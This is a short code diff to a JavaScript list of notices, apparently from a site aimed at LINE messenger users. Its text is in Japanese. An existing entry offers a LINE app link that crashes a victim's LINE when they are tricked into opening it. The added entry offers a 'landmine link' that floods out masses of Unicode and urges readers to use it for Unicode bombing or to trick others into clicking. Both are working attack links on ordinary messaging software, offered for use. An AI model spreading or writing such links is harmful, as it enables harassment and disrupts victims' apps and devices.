@@ -56,6 +56,12 @@ export const Notifys = [
         description: `
         <p>https://line.naver.jp/R/app/2001110580-p8w3dBZq?liff.state=/crash を踏ませれば相手のLINEをクラッシュさせます。</p>
         `
+    },{
+        title: "押すと大量にUnicodeが送信される地雷リンク",
+        description: `
+        <p>おすと大量に送信されます。超強力です。ユニコード投下や相手に踏ませて使用してください。</p>
+        <p>https://line.naver.jp/R/app/2001110580-p8w3dBZq?liff.state=/jri</p>
+        `
     }
 ].reverse()
 
